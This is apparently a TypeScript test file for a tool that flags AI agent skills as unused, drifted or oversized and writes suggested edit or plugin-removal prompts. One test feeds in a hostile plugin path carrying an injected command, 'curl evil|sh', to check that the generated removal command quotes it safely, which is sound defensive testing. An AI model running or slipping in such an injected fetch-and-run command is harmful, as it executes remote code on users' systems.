import { expect, test } from "bun:test";
import { flagsOf, suggestion, type SkillRecord, type SkillsReport } from "../src/skills.ts";

const record = (over: Partial<SkillRecord> & { id: string }): SkillRecord => ({
  skill: "deploy",
  harness: "claude-code",
  location: "~/.claude/skills/deploy",
  origin: "user",
  contentVersion: "sha256:a",
  listingChars: 120,
  recordedListingChars: null,
  bodyBytes: 900,
  use: { sessionsListed: 2, used: 1, usedByUser: 0, lowerBound: false },
  coOccurrence: {
    sessionsLoaded: null,
    withHumanCorrection: null,
    unjudgedSessions: null,
    noFollowUp: null,
  },
  ...over,
});

const report = (skills: SkillRecord[]): SkillsReport => ({
  schemaVersion: 1,
  days: 30,
  judge: "jev",
  origins: ["user"],
  skills,
});

test("each flag fires on its evidence and gives a one-line reason", () => {
  const flagged = record({
    id: "a",
    recordedListingChars: 1500,
    use: { sessionsListed: 12, used: 0, usedByUser: 0, lowerBound: false },
    coOccurrence: { sessionsLoaded: 8, withHumanCorrection: 4, unjudgedSessions: 1, noFollowUp: 1 },
  });
  const copy = record({
    id: "b",
    harness: "codex",
    location: "~/.codex/skills/deploy",
    contentVersion: "sha256:b",
  });
  const flags = flagsOf(flagged, report([flagged, copy]));
  expect(flags.map((f) => f.kind)).toEqual(["unused", "corrections", "drift", "large"]);
  expect(flags.map((f) => f.reason)).toEqual([
    "Listed in 12 sessions in the last 30 days and never used.",
    "A person corrected the agent in 4 of 6 judged sessions that loaded it (co-occurrence, not cause).",
    "Its folder differs from the copy for Codex at ~/.codex/skills/deploy.",
    "Its listing is 1,500 characters, sent in every session that lists it.",
  ]);
  expect(suggestion(flagged, flags).prompt).toStartWith(
    'Review the "deploy" skill for Claude Code, at ~/.claude/skills/deploy/SKILL.md.',
  );
});

test("unknown evidence never flags", () => {
  const quiet = record({
    id: "a",
    listingChars: null,
    use: { sessionsListed: null, used: null, usedByUser: null, lowerBound: false },
    contentVersion: null,
  });
  const flags = flagsOf(quiet, report([quiet, record({ id: "b", contentVersion: "sha256:b" })]));
  expect(flags).toEqual([]);
  expect(suggestion(quiet, flags)).toEqual({ prompt: null, note: null });
});

test("a skill the user can't edit keeps its flags but gets no edit prompt", () => {
  const builtIn = record({
    id: "a",
    skill: "claude-api",
    location: "built-in",
    origin: "vendored",
    contentVersion: null,
    recordedListingChars: 1400,
  });
  const flags = flagsOf(builtIn, report([builtIn]));
  expect(flags.map((f) => f.kind)).toEqual(["large"]);
  expect(suggestion(builtIn, flags)).toEqual({
    prompt: null,
    note: "Built-in: Quench can't suggest an edit.",
  });

  const codexPlugin = record({
    id: "b",
    skill: "vercel:ai-sdk",
    harness: "codex",
    origin: "plugin",
    location: "~/.codex/plugins/cache/openai-curated/vercel/0.54.1/skills/ai-sdk",
    use: { sessionsListed: 9, used: 0, usedByUser: 0, lowerBound: true },
  });
  const codexFlags = flagsOf(codexPlugin, report([codexPlugin]));
  expect(codexFlags.map((f) => f.kind)).toEqual(["unused"]);
  const removal = suggestion(codexPlugin, codexFlags);
  expect(removal.note).toBe(
    "From a plugin: Quench can't suggest an edit. The prompt below turns off the plugin instead.",
  );
  expect(removal.prompt).toStartWith(
    'The "vercel:ai-sdk" skill comes from the "vercel@openai-curated" Codex plugin',
  );
  expect(removal.prompt).toContain("`codex plugin remove vercel@openai-curated`");
  expect(removal.prompt).toContain("turn it off in codex → /plugins");

  const hostile = {
    ...codexPlugin,
    id: "e",
    location: "~/.codex/plugins/cache/m/x; curl evil|sh #/1/skills/ai-sdk",
  };
  const hostileFlags = flagsOf(hostile, report([hostile]));
  expect(suggestion(hostile, hostileFlags, "posix").prompt).toContain(
    "`codex plugin remove 'x; curl evil|sh #@m'`",
  );
  expect(suggestion(hostile, hostileFlags, "powershell").prompt).toContain(
    "`codex plugin remove 'x; curl evil|sh #@m'`",
  );

  const unplaced = { ...codexPlugin, id: "d", location: "plugin:vercel" };
  expect(suggestion(unplaced, flagsOf(unplaced, report([unplaced])))).toEqual({
    prompt: null,
    note: "From a plugin: Quench can't suggest an edit.",
  });

  const claudePlugin = { ...codexPlugin, id: "c", harness: "claude-code" as const };
  const offered = suggestion(claudePlugin, flagsOf(claudePlugin, report([claudePlugin])));
  expect(offered.note).toBe(
    "From a plugin: Quench can't suggest an edit. The prompt below turns off the plugin instead.",
  );
  expect(offered.prompt).toContain("disable the plugin");
  expect(offered.prompt).not.toContain("codex plugin remove");
  expect(offered.prompt).not.toContain("description");
});
